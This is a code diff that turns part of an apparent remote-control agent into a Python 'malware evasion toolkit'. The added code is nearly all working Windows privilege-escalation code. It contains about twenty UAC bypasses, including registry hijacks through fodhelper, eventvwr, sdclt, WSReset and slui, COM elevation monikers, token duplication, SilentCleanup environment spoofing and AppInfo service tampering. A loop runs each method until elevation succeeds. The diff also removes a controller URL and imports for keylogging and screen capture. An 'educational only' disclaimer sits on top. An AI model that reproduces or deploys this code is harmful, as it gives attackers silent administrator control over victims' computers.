@@ -1,15 +1,34 @@
-import socketio
-import requests
-import time
-import uuid
+#!/usr/bin/env python3
+"""
+Advanced Malware Evasion Toolkit (Makoy)
+Extracted from main.py - Comprehensive UAC Bypass and Anti-Detection Techniques
+
+This toolkit contains all UAC bypass methods, anti-detection techniques, persistence mechanisms,
+network evasion, process termination capabilities, and additional evasion features from the original malware.
+
+WARNING: This is for educational and research purposes only.
+"""
+
 import os
+import sys
+import time
+import random
 import subprocess
 import threading
-import mss
-import numpy as np
-import cv2
-import sys
-import random
+import tempfile
+import base64
+import hashlib
+import json
+import uuid
+import socket
+import platform
+import psutil
+import ctypes
+from ctypes import wintypes
+import queue
+
+# Platform detection
+WINDOWS_AVAILABLE = False
 try:
     import win32api
     import win32con
@@ -17,40 +36,749 @@ try:
     import win32security
     import win32process
     import win32event
-    import ctypes
-    from ctypes import wintypes
     import winreg
     WINDOWS_AVAILABLE = True
 except ImportError:
-    WINDOWS_AVAILABLE = False
-    
-import pyaudio
-import base64
-import tempfile
-import pynput
-from pynput import keyboard, mouse
-import pygame
-import io
-import wave
-import socket
-import json
-import asyncio
-import websockets
-try:
-    import speech_recognition as sr
-    SPEECH_RECOGNITION_AVAILABLE = True
-except ImportError:
-    SPEECH_RECOGNITION_AVAILABLE = False
-import psutil
-from PIL import Image
-import platform
-try:
-    import pyautogui
-    PYAUTOGUI_AVAILABLE = True
-except ImportError:
-    PYAUTOGUI_AVAILABLE = False
+    pass
 
-SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
+# ========================================================================================
+# UAC BYPASS TECHNIQUES (UACME-INSPIRED)
+# ========================================================================================
+
+class UACBypassTechniques:
+    """Comprehensive UAC bypass techniques inspired by UACME project"""
+    
+    def __init__(self):
+        self.current_exe = os.path.abspath(__file__)
+        if self.current_exe.endswith('.py'):
+            self.current_exe = f'python.exe "{self.current_exe}"'
+    
+    def bypass_uac_cmlua_com(self):
+        """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            import win32com.client
+            import pythoncom
+            
+            pythoncom.CoInitialize()
+            
+            try:
+                # CLSID for ICMLuaUtil: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+                lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
+                lua_util.ShellExec(self.current_exe, "", "", 0, 1)
+                return True
+            except Exception as e:
+                print(f"ICMLuaUtil COM bypass failed: {e}")
+                return False
+            finally:
+                pythoncom.CoUninitialize()
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_fodhelper_protocol(self):
+        """UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                
+                subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(2)
+                
+                try:
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"Fodhelper protocol bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_computerdefaults(self):
+        """UAC bypass using computerdefaults.exe registry manipulation"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            subprocess.Popen([r"C:\Windows\System32\computerdefaults.exe"], 
+                            creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"Computerdefaults UAC bypass failed: {e}")
+            return False
+    
+    def bypass_uac_dccw_com(self):
+        """UAC bypass using IColorDataProxy COM interface (UACME Method 43)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            import win32com.client
+            import pythoncom
+            
+            pythoncom.CoInitialize()
+            
+            try:
+                lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
+                
+                reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration"
+                lua_util.SetRegistryStringValue(2147483650, reg_path, "DisplayCalibrator", self.current_exe)
+                
+                color_proxy = win32com.client.Dispatch("Elevation:Administrator!new:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")
+                color_proxy.LaunchDccw(0)
+                
+                return True
+                
+            except Exception as e:
+                print(f"ColorDataProxy COM bypass failed: {e}")
+                return False
+            finally:
+                pythoncom.CoUninitialize()
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_dismcore_hijack(self):
+        """UAC bypass using DismCore.dll hijacking (UACME Method 23)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            temp_dir = tempfile.gettempdir()
+            system32_path = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32'
+            
+            current_path = os.environ.get('PATH', '')
+            os.environ['PATH'] = temp_dir + ';' + current_path
+            
+            try:
+                subprocess.Popen([os.path.join(system32_path, 'pkgmgr.exe'), '/n:test'], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(2)
+                return True
+                
+            finally:
+                os.environ['PATH'] = current_path
+                
+        except Exception as e:
+            print(f"DismCore hijack bypass failed: {e}")
+            return False
+    
+    def bypass_uac_wow64_logger(self):
+        """UAC bypass using wow64log.dll hijacking (UACME Method 30)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            temp_dir = tempfile.gettempdir()
+            current_path = os.environ.get('PATH', '')
+            os.environ['PATH'] = temp_dir + ';' + current_path
+            
+            try:
+                subprocess.Popen([r"C:\Windows\SysWOW64\wusa.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(2)
+                return True
+                
+            finally:
+                os.environ['PATH'] = current_path
+                
+        except Exception as e:
+            print(f"WOW64 logger bypass failed: {e}")
+            return False
+    
+    def bypass_uac_silentcleanup(self):
+        """UAC bypass using SilentCleanup scheduled task (UACME Method 34)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            fake_windir = os.path.join(tempfile.gettempdir(), "Windows")
+            fake_system32 = os.path.join(fake_windir, "System32")
+            os.makedirs(fake_system32, exist_ok=True)
+            
+            fake_svchost = os.path.join(fake_system32, "svchost.exe")
+            batch_content = f'@echo off\n{self.current_exe}\n'
+            with open(fake_svchost.replace('.exe', '.bat'), 'w') as f:
+                f.write(batch_content)
+            
+            original_windir = os.environ.get('windir', 'C:\\Windows')
+            os.environ['windir'] = fake_windir
+            
+            try:
+                subprocess.run([
+                    'schtasks.exe', '/Run', '/TN', '\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup'
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+                
+                time.sleep(2)
+                return True
+                
+            finally:
+                os.environ['windir'] = original_windir
+                
+        except Exception as e:
+            print(f"SilentCleanup bypass failed: {e}")
+            return False
+    
+    def bypass_uac_token_manipulation(self):
+        """UAC bypass using token manipulation (UACME Method 35)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['name'].lower() in ['consent.exe', 'slui.exe', 'fodhelper.exe']:
+                        process_handle = win32api.OpenProcess(
+                            win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_DUP_HANDLE,
+                            False,
+                            proc.info['pid']
+                        )
+                        
+                        token_handle = win32security.OpenProcessToken(
+                            process_handle,
+                            win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY
+                        )
+                        
+                        new_token = win32security.DuplicateTokenEx(
+                            token_handle,
+                            win32security.SecurityImpersonation,
+                            win32security.TOKEN_ALL_ACCESS,
+                            win32security.TokenPrimary
+                        )
+                        
+                        si = win32process.STARTUPINFO()
+                        pi = win32process.CreateProcessAsUser(
+                            new_token,
+                            None,
+                            self.current_exe,
+                            None,
+                            None,
+                            False,
+                            0,
+                            None,
+                            None,
+                            si
+                        )
+                        
+                        win32api.CloseHandle(process_handle)
+                        win32api.CloseHandle(token_handle)
+                        win32api.CloseHandle(new_token)
+                        win32api.CloseHandle(pi[0])
+                        win32api.CloseHandle(pi[1])
+                        
+                        return True
+                        
+                except:
+                    continue
+                    
+            return False
+            
+        except Exception as e:
+            print(f"Token manipulation bypass failed: {e}")
+            return False
+    
+    def bypass_uac_junction_method(self):
+        """UAC bypass using NTFS junction/reparse points (UACME Method 36)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            temp_dir = tempfile.gettempdir()
+            junction_dir = os.path.join(temp_dir, "junction_target")
+            os.makedirs(junction_dir, exist_ok=True)
+            
+            try:
+                subprocess.run([
+                    'cmd', '/c', 'mklink', '/J', 
+                    os.path.join(temp_dir, "fake_system32"),
+                    junction_dir
+                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+                
+                return True
+                
+            except subprocess.CalledProcessError:
+                return False
+                
+        except Exception as e:
+            print(f"Junction method bypass failed: {e}")
+            return False
+    
+    def bypass_uac_cor_profiler(self):
+        """UAC bypass using .NET Code Profiler (UACME Method 39)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            profiler_path = os.path.join(tempfile.gettempdir(), "profiler.dll")
+            
+            os.environ['COR_ENABLE_PROFILING'] = '1'
+            os.environ['COR_PROFILER'] = '{CF0D821E-299B-5307-A3D8-B283C03916DD}'
+            os.environ['COR_PROFILER_PATH'] = profiler_path
+            
+            try:
+                subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(2)
+                return True
+                
+            finally:
+                for var in ['COR_ENABLE_PROFILING', 'COR_PROFILER', 'COR_PROFILER_PATH']:
+                    os.environ.pop(var, None)
+                    
+        except Exception as e:
+            print(f"COR profiler bypass failed: {e}")
+            return False
+    
+    def bypass_uac_com_handlers(self):
+        """UAC bypass using COM handler hijacking (UACME Method 40)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            handler_key = r"Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}"
+            command_key = handler_key + r"\Shell\Open\Command"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, command_key)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+                winreg.CloseKey(key)
+                
+                subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(2)
+                
+                try:
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, handler_key)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"COM handlers bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_volatile_env(self):
+        """UAC bypass using volatile environment variables (UACME Method 44)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            env_key = r"Environment"
+            
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, os.path.dirname(self.current_exe))
+                winreg.CloseKey(key)
+                
+                subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(2)
+                
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
+                    winreg.DeleteValue(key, "windir")
+                    winreg.CloseKey(key)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"Volatile environment bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_slui_hijack(self):
+        """UAC bypass using slui.exe registry hijacking (UACME Method 45)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            key_path = r"Software\Classes\exefile\shell\open\command"
+            
+            try:
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
+                    original_value = winreg.QueryValueEx(key, "")[0]
+                    winreg.CloseKey(key)
+                except:
+                    original_value = None
+                
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+                winreg.CloseKey(key)
+                
+                subprocess.Popen([r"C:\Windows\System32\slui.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(2)
+                
+                try:
+                    if original_value:
+                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
+                        winreg.CloseKey(key)
+                    else:
+                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"SLUI hijack bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_eventvwr(self):
+        """UAC bypass using EventVwr.exe registry hijacking (UACME Method 25)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            key_path = r"Software\Classes\mscfile\shell\open\command"
+            
+            try:
+                original_value = None
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
+                    original_value = winreg.QueryValueEx(key, "")[0]
+                    winreg.CloseKey(key)
+                except:
+                    pass
+                
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+                winreg.CloseKey(key)
+                
+                subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(3)
+                
+                try:
+                    if original_value:
+                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
+                        winreg.CloseKey(key)
+                    else:
+                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"EventVwr bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_sdclt(self):
+        """UAC bypass using sdclt.exe (UACME Method 31)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+                winreg.CloseKey(key)
+                
+                subprocess.Popen([r"C:\Windows\System32\sdclt.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(3)
+                
+                try:
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"SDCLT bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_wsreset(self):
+        """UAC bypass using WSReset.exe (UACME Method 56)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                
+                subprocess.Popen([r"C:\Windows\System32\WSReset.exe"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(3)
+                
+                try:
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"WSReset bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_appinfo_service(self):
+        """UAC bypass using AppInfo service manipulation (UACME Method 61)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            try:
+                subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
+                             creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+                
+                subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
+                              f'cmd.exe /c {self.current_exe} && svchost.exe -k netsvcs -p'], 
+                             creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+                
+                subprocess.run(['sc.exe', 'start', 'Appinfo'], 
+                             creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+                
+                time.sleep(2)
+                
+                subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
+                              r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
+                             creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+                
+                return True
+                
+            except:
+                return False
+                
+        except Exception as e:
+            print(f"AppInfo service bypass failed: {e}")
+            return False
+    
+    def bypass_uac_mock_directory(self):
+        """UAC bypass using mock directory technique (UACME Method 62)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            temp_dir = tempfile.gettempdir()
+            mock_system32 = os.path.join(temp_dir, "System32")
+            os.makedirs(mock_system32, exist_ok=True)
+            
+            batch_path = os.path.join(mock_system32, "dllhost.exe")
+            with open(batch_path, 'w') as f:
+                f.write(f'@echo off\npython.exe "{self.current_exe}"\n')
+            
+            original_path = os.environ.get('PATH', '')
+            os.environ['PATH'] = temp_dir + ';' + original_path
+            
+            try:
+                subprocess.Popen(['dllhost.exe'], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(2)
+                return True
+                
+            finally:
+                os.environ['PATH'] = original_path
+                
+        except Exception as e:
+            print(f"Mock directory bypass failed: {e}")
+            return False
+    
+    def bypass_uac_winsat(self):
+        """UAC bypass using winsat.exe (UACME Method 67)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            key_path = r"Software\Classes\Folder\shell\open\command"
+            
+            try:
+                original_value = None
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
+                    original_value = winreg.QueryValueEx(key, "")[0]
+                    winreg.CloseKey(key)
+                except:
+                    pass
+                
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                
+                subprocess.Popen([r"C:\Windows\System32\winsat.exe", "disk"], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(3)
+                
+                try:
+                    if original_value:
+                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
+                        winreg.CloseKey(key)
+                    else:
+                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"Winsat bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def bypass_uac_mmcex(self):
+        """UAC bypass using mmc.exe with fake snapin (UACME Method 68)"""
+        if not WINDOWS_AVAILABLE:
+            return False
+        
+        try:
+            snapin_clsid = "{11111111-2222-3333-4444-555555555555}"
+            key_path = f"Software\\Classes\\CLSID\\{snapin_clsid}\\InProcServer32"
+            
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.current_exe)
+                winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
+                winreg.CloseKey(key)
+                
+                msc_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<MMC_ConsoleFile ConsoleVersion="3.0">
+    <BinaryStorage>
+        <Binary Name="StringTable">
+            <Data>
+                <String ID="1" Refs="1">{snapin_clsid}</String>
+            </Data>
+        </Binary>
+    </BinaryStorage>
+</MMC_ConsoleFile>'''
+                
+                msc_path = os.path.join(tempfile.gettempdir(), "fake.msc")
+                with open(msc_path, 'w') as f:
+                    f.write(msc_content)
+                
+                subprocess.Popen([r"C:\Windows\System32\mmc.exe", msc_path], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                time.sleep(3)
+                
+                try:
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                    os.remove(msc_path)
+                except:
+                    pass
+                    
+                return True
+                
+            except Exception as e:
+                print(f"MMC snapin bypass failed: {e}")
+                return False
+                
+        except ImportError:
+            return False
+    
+    def execute_all_uac_bypasses(self):
+        """Execute all UAC bypass methods"""
+        bypass_methods = [
+            self.bypass_uac_cmlua_com,
+            self.bypass_uac_fodhelper_protocol,
+            self.bypass_uac_computerdefaults,
+            self.bypass_uac_dccw_com,
+            self.bypass_uac_dismcore_hijack,
+            self.bypass_uac_wow64_logger,
+            self.bypass_uac_silentcleanup,
+            self.bypass_uac_token_manipulation,
+            self.bypass_uac_junction_method,
+            self.bypass_uac_cor_profiler,
+            self.bypass_uac_com_handlers,
+            self.bypass_uac_volatile_env,
+            self.bypass_uac_slui_hijack,
+            self.bypass_uac_eventvwr,
+            self.bypass_uac_sdclt,
+            self.bypass_uac_wsreset,
+            self.bypass_uac_appinfo_service,
+            self.bypass_uac_mock_directory,
+            self.bypass_uac_winsat,
+            self.bypass_uac_mmcex,
+        ]
+        
+        for method in bypass_methods:
+            try:
+                if method():
+                    print(f"UAC bypass successful: {method.__name__}")
+                    return True
+            except Exception as e:
+                print(f"UAC bypass method {method.__name__} failed: {e}")
+                continue
+        
+        return False
 
 # --- Agent State ---
 STREAMING_ENABLED = False
